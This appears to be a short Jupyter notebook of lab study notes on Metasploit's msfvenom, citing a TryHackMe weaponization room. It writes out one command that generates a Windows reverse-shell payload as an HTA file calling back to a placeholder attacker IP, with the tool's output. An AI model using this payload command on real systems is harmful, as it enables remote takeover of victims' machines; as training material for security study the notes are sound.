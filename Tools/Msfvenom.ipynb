{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "b6b053b8-0dd7-415f-be87-b472313603ba",
   "metadata": {},
   "source": [
    "# Msfvenom\n",
    "\n",
    "A component of Metasploit, this software can be used to create payloads.\n",
    "\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9c7e144c-dfcf-403e-b7e5-7ec0a2720513",
   "metadata": {},
   "source": [
    "## Create a HTA payload\n",
    "An HTA payload is a HTML application, which is a standalone web page.<br>\n",
    "The example below is from https://tryhackme.com/room/weaponization.<br>\n",
    "This is also a payload in Metasploit itself.<br>"
   ]
  },
  {
   "cell_type": "raw",
   "id": "300d2877-a984-4954-a043-0fa5bac4ff0b",
   "metadata": {},
   "source": [
    "msfvenom -p windows/x64/shell_reverse_tcp LHOST=[attackerIP] LPORT=443 -f hta-psh -o thm.hta\n",
    "[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n",
    "[-] No arch selected, selecting arch: x64 from the payload\n",
    "No encoder specified, outputting raw payload\n",
    "Payload size: 460 bytes\n",
    "Final size of hta-psh file: 7692 bytes\n",
    "Saved as: thm.hta"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
